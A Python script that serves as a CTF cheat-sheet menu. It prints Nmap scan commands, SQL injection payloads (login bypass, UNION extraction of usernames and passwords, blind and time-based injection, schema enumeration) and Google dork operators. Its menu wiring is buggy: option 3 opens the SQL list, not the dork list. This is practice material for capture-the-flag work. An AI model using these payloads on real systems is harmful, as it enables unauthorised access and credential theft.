
def stuff():
    print("this is a list of stuff handy for ctfs that are in one place. Instead of running around the internet looking for or remembering automated scripts")


def murder_death_kill_options():
    while True:
        print("\nChoose an attack option:")
        print("1. Nmap Scanning")
        print("2. SQL Injection Attacks")
        print("3. google dorking ")
        print("Type 'exit' to quit.")

        option = input("What option do you want?: ")

        if option == "1":
            print("You selected Nmap Scanning.")
            quickened_glimpse()   # Call the Nmap scanning options
            
        elif option == "2":
            print("You selected SQL Injection Attacks.")
            sql_injection_glimpse()
        
        elif option == "3":
            print("You selected google dorking Attacks.")
            sql_injection_glimpse()
        
        elif option.lower() == "exit":
            print("Exiting the program.")
            break
        
        else:
            print("Invalid option. Please choose a valid number or type 'exit' to quit.")



def quickened_glimpse(): 
    while True:
        print("\nChoose a fast scan option:")
        print("1. Fast Scan of All Ports")
        print("2. Fast SYN Scan")
        print("3. Service Version Detection")
        print("4. Fast OS Detection")
        print("5. Fast Scan for Open Ports Only")
        print("Type 'exit' to quit.")

        options = input("What fast scan option do you want?: ")

        if options == "1":
            print("Command to run:\n nmap -p- --min-rate 1000 -T4 <target>")
        elif options == "2":
            print("Command to run:\n nmap -p- -sS --min-rate 1000 -T4 <target>")
        elif options == "3":
            print("Command to run:\n nmap -p- -sV --min-rate 1000 -T4 <target>")
        elif options == "4":
            print("Command to run:\n nmap -p- -O --min-rate 1000 -T4 <target>")
        elif options == "5":
            print("Command to run:\n nmap -p- --open --min-rate 1000 -T4 <target>")
        elif options.lower() == "exit":
            print("Exiting to main menu.")
            murder_death_kill_options()

            
        else:
            print("Invalid option. Please choose a number between 1 and 5 or type 'exit' to quit.")




def sql_injection_glimpse():
    attacks = {
        "Bypassing Authentication": "' OR 1=1 --, \" OR \"1\"=\"1\", admin' --, ' OR '1'='1' --",
        "Extracting Database Version": "SELECT @@version;, SELECT version();, SELECT banner FROM v$version;",
        "Finding Current Database User": "SELECT user();, SELECT system_user;, SELECT session_user;",
        "Union-Based SQL Injection": "' UNION SELECT null, username, password FROM users --, ' ORDER BY 3 --",
        "Error-Based SQL Injection": "' UNION SELECT 1,2,3,4,5,@@version --",
        "Boolean-Based Blind SQL Injection": "' AND (SELECT SUBSTRING(database(),1,1))='A' --",
        "Time-Based Blind SQL Injection": "' OR IF(1=1, SLEEP(5), 0) --, ' OR 1=1; WAITFOR DELAY '0:0:5' --",
        "Extracting Data from Different Databases": {
            "MySQL": "SELECT schema_name FROM information_schema.schemata;",
            "MSSQL": "SELECT name FROM master.dbo.sysdatabases;",
            "Oracle": "SELECT table_name FROM all_tables;"
        },
        "Extracting Table and Column Names": {
            "MySQL": "SELECT table_name FROM information_schema.tables;",
            "MSSQL": "SELECT name FROM sysobjects WHERE xtype='U';",
            "Oracle": "SELECT column_name FROM all_tab_columns WHERE table_name='USERS';"
        }
    }

    while True:
        print("\nChoose a SQL injection attack type:")
        for i, attack in enumerate(attacks.keys(), start=1):
            print(f"{i}. {attack}")

        print("Type 'exit' to quit.")
        
        options = input("What SQL injection attack do you want?: ")

        if options.lower() == "exit":
            print("Exiting to main menu.")
            murder_death_kill_options()

            return  # Replace with appropriate function call if needed
        
        try:
            option_index = int(options) - 1
            attack_name = list(attacks.keys())[option_index]
            command_list = attacks[attack_name]
            
            # If the command is a dictionary, print based on DB type
            if isinstance(command_list, dict):
                for db_type, command in command_list.items():
                    print(f"{db_type} Command: {command}")
            else:
                print(f"Commands for {attack_name}: {command_list}")
        except (ValueError, IndexError):
            print("Invalid option. Please choose a number or type 'exit' to quit.")


def google_dork_cheatsheet():
    filters = {
        "allintext": {
            "Description": "Searches for occurrences of all the keywords given.",
            "Example": 'allintext:"keyword"'
        },
        "intext": {
            "Description": "Searches for the occurrences of keywords all at once or one at a time.",
            "Example": 'intext:"keyword"'
        },
        "inurl": {
            "Description": "Searches for a URL matching one of the keywords.",
            "Example": 'inurl:"keyword"'
        },
        "allinurl": {
            "Description": "Searches for a URL matching all the keywords in the query.",
            "Example": 'allinurl:"keyword"'
        },
        "intitle": {
            "Description": "Searches for occurrences of keywords in the title all or one.",
            "Example": 'intitle:"keyword"'
        },
        "allintitle": {
            "Description": "Searches for occurrences of keywords all at a time.",
            "Example": 'allintitle:"keyword"'
        },
        "site": {
            "Description": "Specifically searches that particular site and lists all the results for that site.",
            "Example": 'site:"www.google.com"'
        },
        "filetype": {
            "Description": "Searches for a particular file type mentioned in the query.",
            "Example": 'filetype:"pdf"'
        },
        "link": {
            "Description": "Searches for external links to pages.",
            "Example": 'link:"keyword"'
        },
        "numrange": {
            "Description": "Used to locate specific numbers in your searches.",
            "Example": 'numrange:321-325'
        },
        "before": {
            "Description": "Used to search within a particular date range.",
            "Example": 'filetype:pdf & (before:2000-01-01 after:2001-01-01)'
        },
        "after": {
            "Description": "Used to search within a particular date range.",
            "Example": 'filetype:pdf & (before:2000-01-01 after:2001-01-01)'
        },
        "allinanchor": {
            "Description": "Shows sites which have the key terms in links pointing to them, in order of the most links.",
            "Example": 'inanchor:rat'
        },
        "allinpostauthor": {
            "Description": "Exclusive to blog search, picks out blog posts written by specific individuals.",
            "Example": 'allinpostauthor:"keyword"'
        },
        "related": {
            "Description": "Lists web pages that are 'similar' to a specified web page.",
            "Example": 'related:www.google.com'
        },
        "cache": {
            "Description": "Shows the version of the web page that Google has in its cache.",
            "Example": 'cache:www.google.com'
        }
    }

    while True:
        print("\nChoose a Google Dork filter to view:")
        for i, (filter_name, filter_info) in enumerate(filters.items(), start=1):
            print(f"{i}. {filter_name}")

        print("Type 'exit' return to main menu .")
        
        options = input("What Google Dork filter do you want to see?: ")

        if options.lower() == "exit":
            print("Exiting to main menu.")
            murder_death_kill_options()
        
        try:
            option_index = int(options) - 1
            filter_name = list(filters.keys())[option_index]
            print(f"\n{filter_name}:\nDescription: {filters[filter_name]['Description']}\nExample: {filters[filter_name]['Example']}")
        except (ValueError, IndexError):
            print("Invalid option. Please choose a number or type 'exit' to quit.")

# You can call google_dork_cheatsheet() to display the cheatsheet options.

murder_death_kill_options()
